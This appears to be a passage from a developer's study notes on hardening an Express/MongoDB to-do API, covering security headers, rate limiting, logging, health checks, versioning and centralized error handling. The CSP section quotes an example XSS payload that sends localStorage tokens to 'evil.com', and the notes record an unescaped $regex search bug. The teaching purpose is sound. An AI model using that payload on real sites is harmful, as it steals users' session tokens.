#### 2. `X-Frame-Options: DENY` — stop clickjacking

The attack:

```
evil-site.com
┌──────────────────────────────────┐
│  [ Click to claim your prize ]   │  ← attacker's visible button
│                                  │
│  <iframe src="yourapp.com">      │  ← your app, invisible (opacity 0)
│     [ Delete all tasks ]         │  ← sits exactly under the button
└──────────────────────────────────┘
```

You are already logged in, so the iframe is authenticated. Your click lands on the button underneath and the request goes out **with your real credentials**.

**Why existing defenses don't help:** valid JWT, real user, well-formed request, validation passes. Nothing is malformed — the user was tricked about *what they clicked*.

```
X-Frame-Options: DENY          ← no framing at all
X-Frame-Options: SAMEORIGIN    ← only my own domain may frame me
```

#### 3. `Content-Security-Policy` — stop injected scripts from running

If a stored comment contains `<script>fetch('evil.com?token=' + localStorage.token)</script>` and the frontend renders it, the browser runs it with full access to the page — localStorage, cookies, your API. That's XSS.

Escaping output is the first layer, but one missed spot is a breach. CSP is the second layer: a whitelist of **where resources may come from**.

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

An injected inline `<script>` has no source URL, so it isn't "from `'self'`" → the browser refuses to execute it and logs a CSP violation.

**Why people disable it:** it blocks inline scripts/styles by default, which many libraries, analytics snippets and CSS-in-JS tools rely on. Fixing that properly means per-source allowances or nonces.

**For a JSON API:** harmless — no HTML to execute. It becomes real work when Next.js serves pages. Note CSP protects the page that *renders* data, so the header that matters for XSS is the **frontend's**, not the API's.

#### 4. `Strict-Transport-Security` — stop HTTPS downgrade

The gap is the **first** request. Type `yourapp.com` (no protocol) → browser tries `http://` → your server redirects to HTTPS. That first request went out in plaintext, and someone on the same WiFi can answer it with a fake copy of your site (SSL stripping).

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

Seen once, the browser remembers for a year: **never** contact this domain over HTTP again — the redirect now happens inside the browser, before any packet leaves.

**Two catches:**
- Only helps *after* the first successful HTTPS visit (browser preload lists exist for that gap).
- `max-age` is a commitment you can't undo — if your certificate later expires, browsers refuse to connect and you can't reach them over HTTP to fix it. Start with a small `max-age`, raise it when confident.

**Does nothing on `localhost`** over HTTP — browsers ignore it locally. Matters only after deploy with real TLS.

---

### Q: Hand-roll them or use Helmet?

**Use Helmet.** This is the opposite of the input-validation decision (hand-rolled, see `controllers/task.js`):

| | Input validation | Security headers |
|---|------------------|------------------|
| The rules are | **My** business logic (title 3–100, tags ≤ 20) | Standardised, identical for every app |
| Changes when | My product changes | Browsers deprecate things |
| Verdict | ✅ hand-rolled — writing it taught me the domain | ✅ library — maintenance with no upside |

Example of that maintenance: `X-XSS-Protection` used to be recommended, is now considered harmful, and Helmet dropped it.

**Worth doing once for learning:** set the four headers by hand with `res.set()`, look at the response **Headers** tab in Postman, then replace with `app.use(helmet())` and compare — roughly a dozen headers instead of four. That's the concrete answer to "what does this library do for me."

```js
app.use(helmet());
```

**What this project actually sends** (first middleware in `app.js`, so 404s and errors carry them too):

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; ...
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
```

Two of those are worth a second look:

| Header | Why it looks odd |
|--------|------------------|
| **`X-XSS-Protection: 0`** | Deliberately **disabling** the old browser XSS filter — it was itself exploitable, so the modern advice is off + rely on CSP |
| **`X-Frame-Options: SAMEORIGIN`** | Helmet's default is the looser one; `DENY` needs `frameguard: { action: 'deny' }` if the API should never be framed at all |

**Helmet does not break CORS.** `Cross-Origin-Resource-Policy: same-origin` governs *subresource* loading (images, scripts), not `fetch`/XHR — those are still controlled by your CORS config, which runs right after.

**Free win regardless:** Express advertises itself with `X-Powered-By: Express`, telling an attacker what to target. Helmet removes it; without Helmet:

```js
app.disable('x-powered-by');
```

---

### One-line summary

**`nosniff` stops type guessing, `X-Frame-Options` stops clickjacking, CSP stops injected scripts from executing, HSTS stops downgrade attacks — and Helmet sets that whole family with sensible defaults in one line.**

---

## 11. Rate limiting — what it is, strategies, what we use

**Files:** `middleware/rateLimit.js`, `app.js`, `.env`

### Q: What is rate limiting?

**A:** A cap on **how many requests one client can send in a time window**.

If they exceed the limit, the server responds **`429 Too Many Requests`** instead of running your controller again.

```
Client sends request #11 (limit was 10)
        │
        ▼
  rate limit middleware  → 429 JSON, stop here
        │
        ▼
  controller never runs  (saves DB + CPU)
```

**One line:** Rate limiting protects your API from abuse, brute-force login, and accidental traffic spikes.

---

### Q: Why do we need it?

| Threat | Without rate limit | With rate limit |
|--------|-------------------|-----------------|
| **Brute-force login** | Attacker tries 10,000 passwords | Blocked after N tries per IP |
| **Spam register** | Thousands of fake accounts | Slowed / blocked |
| **API abuse** | One client hammers `GET /tasks` | DB and server stay healthy |
| **Accidental loops** | Buggy frontend retries forever | Stops at the cap |

Rate limiting is **not** a full DDoS solution (huge attacks need CDN/WAF/cloud LB), but it's a **standard baseline** for every production API.

---

### Q: What strategies exist?

#### 1. By algorithm (how the window works)

| Strategy | How it works | Pros | Cons |
|----------|--------------|------|------|
| **Fixed window** | Count requests in fixed blocks (e.g. every 15 min) | Simple, fast | Burst at window boundary |
| **Sliding window** | Rolling time window | Smoother, fairer | More memory / logic |
| **Token bucket** | Tokens refill at a rate; each request costs 1 token | Allows controlled bursts | Harder to configure |
| **Leaky bucket** | Requests queue and drip out at fixed rate | Very smooth output | Can feel slow to clients |

#### 2. By what you limit (the “key”)

| Strategy | Key | Use when |
|----------|-----|----------|
| **Per IP** | `req.ip` | Default — stop abuse from one machine/network |
| **Per user** | `req.user._id` after login | Fair limits per account (paid tiers) |
| **Per route** | Different limits for `/auth` vs `/tasks` | Protect sensitive endpoints more |
| **Per API key** | Header or key id | Public APIs with partner quotas |
| **Global** | Entire server | Protect total capacity |

#### 3. By scope

| Scope | Example |
|-------|---------|
| **Whole app** | `app.use(limiter)` — everything |
| **Route group** | `/auth` stricter than `/tasks` — **what we do** |
| **Single route** | Only `POST /auth/login` |

#### 4. By storage (where counts live)

| Store | When |
|-------|------|
| **In-memory** (default) | Single server, learning, small apps — **what we use** |
| **Redis** | Multiple servers share one counter |
| **Database** | Rare; Redis is preferred at scale |

---

### Q: What did we choose in this project?

| Decision | Our choice | Why |
|----------|------------|-----|
| **Library** | `express-rate-limit` | Standard for Express; easy middleware |
| **Algorithm** | **Fixed window** | Built into the library; good enough to learn |
| **Key** | **Per IP** (`req.ip`) | Default; stops one client from spamming |
| **Scope** | **Two limiters, route groups** | Auth needs stricter rules than tasks |
| **Storage** | **In-memory** | Fine for local dev + single-server deploy |
| **Response** | JSON `429` + `RateLimit-*` headers | Clients know they're blocked and when |

---

### Our two limiters

**File:** `middleware/rateLimit.js`

| Limiter | Mounted on | Default max | Purpose |
|---------|------------|-------------|---------|
| **`authLimiter`** | `/auth/*` | 10 / 15 min | Slow brute-force on login & register |
| **`apiLimiter`** | `/tasks/*` | 10 / 15 min (override via `.env`) | Protect task CRUD from hammering |

Configured via `.env`:

```env
RATE_LIMIT_WINDOW_MS=900000   # 15 minutes in milliseconds
RATE_LIMIT_MAX=100            # /tasks — tune for dev vs prod
RATE_LIMIT_AUTH_MAX=10        # /auth — keep strict
```

**Wired in `app.js`:**

```js
const { apiLimiter, authLimiter } = require('./middleware/rateLimit');

app.use('/tasks', apiLimiter, TaskRoutes);
app.use('/auth', authLimiter, AuthRoutes);
```

**Request flow:**

```
POST /auth/login
     │
     ▼
cors → json → authLimiter → routes/auth → controller

GET /tasks  (+ Bearer token)
     │
     ▼
cors → json → apiLimiter → protect → routes/task → controller
```

Rate limit runs **before** auth and controllers — even failed `401` responses **still count** toward the limit.

---

### Q: What does `429` look like?

**Status:** `429 Too Many Requests`

**Body:**

```json
{
  "message": "Too many requests, please try again later"
}
```

**Response headers (when limit not yet hit):**

| Header | Example | Meaning |
|--------|---------|---------|
| `RateLimit-Policy` | `10;w=900` | 10 requests per 900 seconds |
| `RateLimit-Limit` | `10` | Max allowed |
| `RateLimit-Remaining` | `7` | 3 used, 7 left |
| `RateLimit-Reset` | `895` | Seconds until window resets |

---

### Q: Why did browser get 429 but Postman kept working?

**A:** They often hit **different counters** — not because Postman bypasses the limit.

| Cause | Explanation |
|-------|-------------|
| **`localhost` vs `127.0.0.1`** | Browser may use IPv6 `::1`, Postman IPv4 `127.0.0.1` — **two IPs, two buckets** |
| **CORS preflight** | Cross-origin browser `fetch` sends **OPTIONS + GET** = 2 hits per “one call” |
| **Server restart** | In-memory counter resets — Postman test after restart looks “fresh” |

**Fix for fair testing:** use the same URL everywhere, e.g. always `http://127.0.0.1:3005`.

---

### Q: What changes in production?

| Topic | Dev (now) | Production (later) |
|-------|-----------|-------------------|
| **Store** | In-memory | **Redis** when you run 2+ servers |
| **Limits** | Low for testing (`10`) | Higher for `/tasks`, strict for `/auth` |
| **Trust proxy** | Not needed locally | `app.set('trust proxy', 1)` behind Render/nginx so `req.ip` is the real client IP |
| **Per-user limits** | Not yet | Optional: `keyGenerator: (req) => req.user?.id ?? req.ip` |

---

### Strategies we did **not** use yet (future)

- Sliding window / token bucket (advanced libraries or Redis)
- Per-user rate limits after JWT login
- Separate limiter only on `POST /auth/login`
- Skip counting successful requests (`skipSuccessfulRequests: true`)
- Whitelist internal IPs or health-check path

---

### One-line summary

**We use `express-rate-limit` with a fixed window, per IP, in-memory — stricter on `/auth` (10/15 min) than `/tasks` (configurable). Over limit → `429` JSON + `RateLimit-*` headers. For multi-server production, move counters to Redis.**

See also: [`readme.md` — Rate limiting](readme.md#rate-limiting) and [API performance & monitoring](readme.md#api-performance--monitoring).

---

## 12. Request logging (morgan) + health check

**Status:** ✅ both built — `app.js` (morgan + `GET /health`)

Two related but **different** things: logging tells you what *happened*, the health check tells you whether the app is *alive*.

---

### Q: Why request logging?

Today nothing records requests. When something breaks you only see whatever the global error handler prints — with no idea which request caused it.

Morgan is middleware that logs **one line per request, after the response is sent**:

```
GET /tasks 200 12.483 ms - 1247
POST /auth/login 401 89.201 ms - 38
PATCH /tasks/6a733d 400 3.109 ms - 156
```

| Column | Meaning |
|--------|---------|
| `GET` | Method |
| `/tasks` | URL |
| `200` | Status code |
| `12.483 ms` | **Response time** — first look at slow endpoints |
| `1247` | Response size in bytes |

That response-time column is the underrated one: it's how you'd notice a `$regex` search degrading as the `tasks` collection grows.

### Where it goes

Early in the chain, right after `helmet()` — so **404s and rate-limited 429s get logged too**.

```js
const morgan = require('morgan');

app.use(helmet());
app.use(morgan('dev'));   // local
```

| Format | Output | Use |
|--------|--------|-----|
| **`dev`** | Short, coloured by status | Local development |
| **`combined`** | Apache combined (IP, user-agent, referrer) | Production — what log tooling expects |
| **`tiny`** | Minimal | Noise reduction |

### What morgan does **not** do

| Limit | Fix later |
|-------|-----------|
| Logs **requests only** — knows nothing about internal app events | Keep logging in the global error handler |
| **Unstructured text** — fine in a terminal, painful to search in a hosting dashboard | `winston` / `pino` → JSON logs with levels |
| No request id, so multi-line traces can't be correlated | `X-Request-Id` + custom token |

⚠️ **Never log the `Authorization` header or request bodies.** Morgan's built-in formats don't — but a custom token makes it easy to write tokens and passwords to disk forever.

---

### Q: Why a health check?

`GET /health` is a tiny **public** endpoint answering "is this instance working?" Used by:

- hosting platforms, to decide whether to keep routing traffic to this instance
- uptime monitors
- you, right after a deploy

### It must check something real

A handler that just returns `{ status: "ok" }` only proves Node is running — which stays true while MongoDB is unreachable and every real request fails.

```js
mongoose.connection.readyState   // 0 disconnected, 1 connected, 2 connecting, 3 disconnecting
```

| DB state | Status code | Why |
|----------|-------------|-----|
| `1` connected | **200** | Healthy |
| anything else | **503** | The code platforms read as "pull this instance out of rotation" |

### Three details that trip people up

| Rule | Reason |
|------|--------|
| **No auth** | A load balancer has no JWT |
| **Cheap** | Pinged as often as every 10s — `readyState` is a free property read; a real DB query per ping is not |
| **No internals** | It's public — don't leak versions, env names, or connection strings |

**Rate limiting:** our limiters are scoped to `/tasks` and `/auth`, so `/health` is unaffected — good, because a `429` on the health check makes a healthy app look dead to the platform.

---

### What this project built

**Logging** (`app.js`, two morgan mounts — each request passes through both):

```js
const skipHealthCheck = (req) => req.path === '/health';

app.use(morgan(isProduction ? 'combined' : 'dev', { skip: skipHealthCheck }));

if (!isProduction) {
    app.use(morgan('combined', {
        stream: fs.createWriteStream(path.join(logsDir, 'access.log'), { flags: 'a' }),
        skip: skipHealthCheck
    }));
}
```

| Detail | Why |
|--------|-----|
| **`req.path` not `req.url`** | `url` keeps the query string — `/health?probe=1` would slip past the skip |
| **`flags: 'a'`** | Append. The default `'w'` truncates the file on every restart |
| **`path.join(__dirname, …)`** | Resolves next to the file, not to whatever directory `npm start` ran from |
| **`createWriteStream` once at startup** | No file-open cost per request |
| **File write only when `!isProduction`** | Container disks are ephemeral and the file grows unbounded — production logs to stdout for CloudWatch / Azure Monitor to capture |
| **Mounted above `express.json()`** | Fine, morgan doesn't read bodies. A custom body token would have to move below the parser |

**Health check** (`app.js`, before the route mounts):

```js
app.get('/health', (req, res) => {
    const dbConnected = mongoose.connection.readyState === 1;

    res.status(dbConnected ? 200 : 503).json({
        status: dbConnected ? 'ok' : 'unavailable',
        db: dbConnected ? 'connected' : 'disconnected',
        uptime: Math.floor(process.uptime())
    });
});
```

```
GET /health → 200 {"status":"ok","db":"connected","uptime":25}
```

`uptime` is process seconds — handy for spotting silent restarts. No version or env details: the endpoint is public.

---

### Q: Do production apps log response bodies?

**No — it's the exception**, and always deliberate.

| Reason to avoid | Detail |
|-----------------|--------|
| **Volume** | A body can be 100× the log line; log storage is billed per GB ingested |
| **Privacy** | Bodies hold user data — and a login response holds the JWT, kept for the whole retention window |
| **Performance** | Capturing a body means buffering the response instead of streaming it |

**What is logged instead:** metadata — status, duration, size, route, request id, user id. For "why did this fail?", the error handler logs the raised error + stack (Sentry-style), so you get the reason without recording the payload.

**When bodies are logged:** opt-in, **redacted** (`password`, `token`, `authorization` → `[REDACTED]`), sampled or errors-only, short retention. AWS API Gateway can do it — off by default, switched on to debug. Regulated domains (fintech, healthcare) keep exact payloads in dedicated encrypted audit stores, not app logs.

---

### Q: Where do access logs live in real apps? (not Redis)

**Redis is the wrong tool** — in-memory means RAM prices for write-once data, with no retention policies or full-text search. Its real jobs here are caching, rate-limit counters, sessions. It *can* be a **buffer** in a pipeline (app → Redis stream → shipper → log store), which is the pipe, not the warehouse.

| Setup | Where logs live |
|-------|-----------------|
| Single VPS | Files on disk + `logrotate`; plus nginx's own `/var/log/nginx/access.log` |
| PM2 | `~/.pm2/logs/*.log` + `pm2-logrotate` |
| Self-hosted, multi-server | Grafana **Loki** (log-specific, cheap), **OpenSearch**/ELK, **ClickHouse** at high volume |
| Managed cloud | CloudWatch Logs, Azure Monitor (KQL), or SaaS — Datadog, Better Stack, Papertrail |

**The app's only job is to print to stdout** — everything above is infrastructure capturing that stream, no Express changes needed. That's why `combined` matters: every one of those tools parses it out of the box.

Elasticsearch / OpenSearch **is** the "database for logs" — a search engine built for append-heavy writes and text queries, which Mongo and Redis are not.

⚠️ **On deploy:** `app.set('trust proxy', 1)`, or every logged IP is the load balancer's, not the client's.

---

### One-line summary

**`morgan` gives one log line per request (method, URL, status, duration) — mounted early so 404s count; `GET /health` returns 200 only when `mongoose.connection.readyState === 1`, otherwise 503, unauthenticated and cheap.**

See also: [`readme.md` — API performance & monitoring](readme.md#api-performance--monitoring).

---

## 13. API versioning — `/api/v1`

**Status:** ✅ `routes/v1.js` + `V1_PREFIX` in `app.js`

### Q: Why version an API?

Because **you can change the code, but you can't change the clients**. Once something calls your API — a mobile app in the store, another team's service, a cron job — you can't force it to update on your schedule.

| Reason | Example in this project |
|--------|-------------------------|
| **Breaking changes without breaking clients** | v1 errors are `{ message }`; a v2 could be `{ success, status, errors[] }` — both live at once |
| **Clients migrate when ready** | Old app keeps using v1 while the new web app uses v2 |
| **Honest deprecation** | v1 stays up, is announced as deprecated, removed on an agreed date |

**What counts as breaking:** removing a field, renaming a field, changing a type, adding a required input, changing a status code. **Not** breaking: *adding* an optional field or a new endpoint — that's why you don't need a version for every change.

---

### Q: Where does the version go?

| Style | Example | Notes |
|-------|---------|-------|
| **URL path** ✅ | `/api/v1/tasks` | Visible, cacheable, trivial to test in a browser/Postman — most common |
| Header | `Accept: application/vnd.todo.v2+json` | "Purer" REST, but invisible and harder to debug |
| Query param | `/tasks?version=2` | Easy to forget, messy with caching |

This project uses the **path** — same as GitHub, Stripe-style major versions, and most public APIs.

---

### How it's wired

**`routes/v1.js`** — everything the v1 contract covers, including which limiter guards each group:

```js
router.use('/tasks', apiLimiter, TaskRoutes);
router.use('/auth', authLimiter, AuthRoutes);
```

**`app.js`** — one prefix, one mount:

```js
const V1_PREFIX = '/api/v1';
const v1Routes = require('./routes/v1');

app.use(V1_PREFIX, v1Routes);
```

**Why this shape:** `routes/task.js` and `routes/auth.js` don't know their own prefix — they only declare `'/'` and `'/:id'`. So a v2 is a new `routes/v2.js` plus one more `app.use`, with **no edits inside the individual route files**. A v2 can even reuse v1's task router while overriding only the endpoints that changed.

```
GET /api/v1/tasks/:id
    │        │      │
    │        │      └─ routes/task.js  → router.get('/:id', …)
    │        └──────── routes/v1.js    → router.use('/tasks', …)
    └───────────────── app.js          → app.use(V1_PREFIX, v1Routes)
```

---

### Q: Why is `/health` not versioned?

Because it describes the **server**, not the API contract. Load balancers and platform probes need one stable URL that never changes across versions. Same reasoning applies to `/metrics` and (later) `/api-docs`.

---

### Q: What about the old `/tasks` URLs?

They now return **404** — a clean break, fine here because the only client is Postman.

A real API with live clients would instead keep the old paths mounted alongside the new ones for a deprecation window, add a `Deprecation` / `Sunset` response header, and log usage to see who still calls them.

⚠️ **Update your Postman collection** — keep the base URL in a collection variable (`{{baseUrl}}` = `http://localhost:3005/api/v1`) so the next version is one edit instead of one per request.

---

### Q: So from now on, do I make every change in v2?

**No.** Most changes still go straight into v1 — only **breaking** ones need a new version.

| Change | Where | Why |
|--------|-------|-----|
| Bug fix | **v1** | Clients want the fix |
| New endpoint | **v1** | Old clients simply don't call it |
| New **optional** field in a response | **v1** | Old clients ignore unknown fields |
| Internal refactor | **v1** | No visible contract change |
| Remove / rename a field | **v2** | Client code reading it breaks |
| Change a field's type | **v2** | Parsing breaks |
| Change a status code | **v2** | Error handling breaks |
| Add a **required** input | **v2** | Existing requests become invalid |

**Real examples from this project:**

| Change already made | Breaking? |
|---------------------|-----------|
| Default `status`: `pending` → `not-started` | ⚠️ **Yes** — a client with `if (status === 'pending')` breaks |
| Added `errors[]` alongside `message` | ✅ No — extra field, old clients still read `message` |
| `AppError` reshaping errors to `{ success, status, message, errors[] }` | ⚠️ **Yes** — would be a v2 change |

---

### Q: Does v2 replace v1?

**No — they run side by side.** That's the whole point: both are live, clients migrate at their own pace, and v1 is sunset on an announced date once nobody calls it.

```js
// app.js
app.use('/api/v1', v1Routes);
app.use('/api/v2', v2Routes);   // both serving traffic
```

### Q: Is v2 a copy of the project?

**No — that's the trap.** Duplicating controllers per version means fixing every bug twice and the versions silently drifting apart.

Reuse everything that didn't change and override only what did:

```js
// routes/v2.js — tasks changed; auth is identical, so reuse v1's router
router.use('/tasks', apiLimiter, TaskRoutesV2);
router.use('/auth', authLimiter, AuthRoutes);
```

Shared model, shared validation, shared business logic — the version-specific layer is usually thin, often just a different **response formatter**.

---

### One-line summary

**Version in the URL path so breaking changes can ship without breaking existing clients: `routes/v1.js` owns the v1 contract, `app.js` mounts it at a single `V1_PREFIX`, and `/health` stays outside the version because it describes the server, not the API.**

---

## 14. Centralized error handling — the `AppError` class

**Status:** ✅ `utils/AppError.js` + rewritten handler in `app.js` (lines 130–161)

Replaces the handler in [§6](#6-global-error-handler--err-req-res-next). Three problems with the old one, all fixed here:

| Old problem | Consequence |
|-------------|-------------|
| `message: err.message` for **every** error | A `MongoServerError` or a stack-trace message went straight to the client |
| Each controller built its own `res.status(400).json({ ... })` | Four different response shapes across the API |
| `protect` and the rate limiter answered directly | 401s and 429s bypassed the handler entirely |

---

### Q: How many kinds of errors are there?

**Two** — and the whole design is about telling them apart.

| | **Operational errors** | **Programmer errors** (bugs) |
|---|------------------------|------------------------------|
| Meaning | Expected, part of normal operation | Something you didn't foresee |
| Examples | Bad input, wrong password, task not found, duplicate email | Typo, `undefined` dereference, invalid regex reaching MongoDB |
| Whose fault | Usually the client's | Yours |
| Message is | Written **for** the client | Written for a Node developer — often leaks internals |
| Client should see | The real message | **Nothing** — a generic 500 |
| You should | Return a clear status code | Log it, then go fix the code |

**Naming note:** `normaliseError` is not a *kind* of error — it's the function that sorts library errors into the operational bucket.

---

### The class

```js
class AppError extends Error {
    constructor(message, statusCode, errors = []) {
        super(message);

        this.statusCode = statusCode;
        this.errors = errors;
        this.isOperational = true;

        Error.captureStackTrace(this, this.constructor);
    }
}
```

| Piece | Why |
|-------|-----|
| **`extends Error`** | Still a real error — works with `throw`, `catch`, `instanceof`, and keeps a stack |
| **`statusCode`** | The HTTP status travels *with* the error, so the handler doesn't have to guess |
| **`errors = []`** | Optional per-field detail (`[{ field, message }]`) — same array validation already produced |
| **`isOperational = true`** | The marker: "this message was written for the client" |
| **`captureStackTrace`** | Drops the constructor frame so the stack points at the `throw` site, not at `AppError.js` |

---

### Q: Three sources, two categories

Operational errors reach the handler two ways; everything else is a bug.

```
1. You raised it          throw new AppError('Task not found', 404)
                                    │
2. A library threw        ValidationError / CastError / 11000 / bad JSON
   something known                  │  normaliseError() converts it
                                    ▼
                              ── AppError ──  → real message, your status code

3. Anything else          TypeError, MongoServerError, …
                                    │  normaliseError returns it unchanged
                                    ▼
                              plain Error   → logged in full, client gets 500
```

**`normaliseError` handles four library errors** — the ones this app actually hits:

| Incoming | Becomes | Status |
|----------|---------|--------|
| Mongoose `ValidationError` | `Validation failed` + one entry per bad field | **400** |
| Mongoose `CastError` | `Invalid id format` | **400** |
| MongoDB `code 11000` | `Email already registered` | **409** |
| `err.type === 'entity.parse.failed'` (body-parser) | `Malformed JSON in request body` | **400** |

Its last line is the important one:

```js
    return err;   // not recognised → stays a plain Error → treated as a bug
};
```

**Safe by default:** a library error you've never seen is hidden automatically. Exposing a message is opt-in — you have to wrap it in an `AppError`. The other way round, every new error type would leak until you noticed.

---

### The handler

```js
app.use((err, req, res, next) => {
    const error = normaliseError(err);
    const isKnown = error instanceof AppError;

    if (!isKnown) {
        console.error('Unhandled error ===>', error);
    }

    const statusCode = isKnown ? error.statusCode : 500;
    const message = isKnown ? error.message : 'Something went wrong';

    const body = { success: false, status: statusCode, message };

    if (isKnown && error.errors.length > 0) {
        body.errors = error.errors;
    }

    if (!isProduction && !isKnown) {
        body.stack = error.stack;
    }

    res.status(statusCode).json(body);
});
```

| Line | Why |
|------|-----|
| **`instanceof AppError`** | One check decides everything below it |
| **`console.error` only when `!isKnown`** | A 404 isn't worth a log line; a bug is. Old handler logged every error at equal volume |
| **`'Something went wrong'`** as a literal | Never `error.message` for a bug — that's the leak |
| **`errors` added conditionally** | Clients don't get an empty array to check |
| **`stack` only when `!isProduction`** | Useful locally, absent after deploy |

---

### The response shape (every error, one format)

```json
{
  "success": false,
  "status": 400,
  "message": "Validation failed",
  "errors": [
    { "field": "title", "message": "title must be a string between 3 and 100 characters" }
  ]
}
```

| Field | Always present? |
|-------|-----------------|
| `success` | ✅ always `false` on errors |
| `status` | ✅ mirrors the HTTP status code |
| `message` | ✅ one human-readable sentence |
| `errors` | Only when there's per-field detail |
| `stack` | Only for **bugs**, only outside production |

---

### How controllers raise errors now

```js
// inside a try block — the catch forwards it
throw new AppError('Task not found', 404);

// outside a try block — hand it to Express yourself
return next(new AppError('No valid fields to update', 400));

// with field detail
throw new AppError('Send an array of ids in the body', 400, [
    { field: 'ids', message: 'ids must be a non-empty array' }
]);
```

**Rule:** controllers never build error responses. The only `res.status(...)` calls left in `controllers/` are success paths (`200`, `201`).

| Why `throw` inside `try`? | The existing `catch (e) { next(e) }` already forwards it — one exit path instead of two |

---

### Two behaviour changes worth remembering

**1. 404 and 429 now go through the handler.**

```js
// unknown route — was res.status(404).json(...) directly
app.use((req, res, next) => {
    next(new AppError(`Route not found: ${req.method} ${req.originalUrl}`, 404));
});
```

The rate limiter's handler does the same with a 429. Result: unknown routes, rate limits, validation failures and 500s all share one shape — a client can write a single error parser.

**2. `middleware/auth.js` — `jwt.verify` got its own `try`.**

Before, one `catch` wrapped both the token check *and* the database lookup:

```js
} catch (e) {
    return res.status(401).json({ message: 'Not authorized, invalid token' });
}
```

So a **database outage** during `User.findById` was reported as "invalid token" — a real outage disguised as a login problem. Now:

| Step | Own try/catch | Failure means |
|------|---------------|---------------|
| `jwt.verify(token, secret)` | ✅ | Expired or tampered token → **401**, never a bug |
| `User.findById(...)` | ✅ separate | User deleted → **401**; DB down → `next(e)` → **500** |

**Lesson:** a `catch` block that's too wide turns bugs into misleading operational errors.

---

### Q: What was verified?

Thirteen cases against a running server, all returning the unified shape:

| Request | Status |
|---------|--------|
| Unknown route | 404 |
| Malformed JSON body | 400 |
| Wrong credentials | 401 |
| No token / invalid token | 401 |
| Duplicate registration | 409 |
| Bad fields on create | 400 + `errors[]` |
| Malformed id (`/tasks/not-an-id`) | 400 + `errors[]` |
| Valid id, no such task | 404 |
| Empty `PATCH` body | 400 |
| Bulk over the 10-task limit | 400 |
| Bulk delete with no `ids` | 400 |

**The bug path**, tested with `GET /api/v1/tasks?search=[` — an invalid regex reaching MongoDB:

```
Client (production mode):
  500 { "success": false, "status": 500, "message": "Something went wrong" }

Server console:
  Unhandled error ===> MongoServerError: Regular expression is invalid:
  missing terminating ] for character class
      at Connection.sendCommand (...)
```

Full detail for you, nothing for the attacker. In development the same response includes `stack`.

⚠️ **That test exposed a separate real bug:** `getTasks` passes `req.query.search` straight into `$regex`, so any regex metacharacter changes the query's meaning — or crashes it. Needs escaping. See [`todo.md`](todo.md).

---

### Q: Is this a breaking change?

**Yes** — the response shape went from `{ message }` to `{ success, status, message, errors? }`. By the rules in [§13](#13-api-versioning--apiv1) that's a **v2** change. It ships in v1 here because the only client is Postman; a real API with live clients would add the new shape under `/api/v2` and leave v1 answering the old way.

---

### One-line summary

**Every error now flows through one handler in `app.js`. `AppError` marks the ones whose message is safe to show — raised deliberately or converted by `normaliseError` — and everything else is treated as a bug: logged in full, answered with a bare 500.**

See also: [`readme.md`](readme.md) error handling section, [§6](#6-global-error-handler--err-req-res-next) for the Express mechanics, [§13](#13-api-versioning--apiv1) on why this counts as breaking.

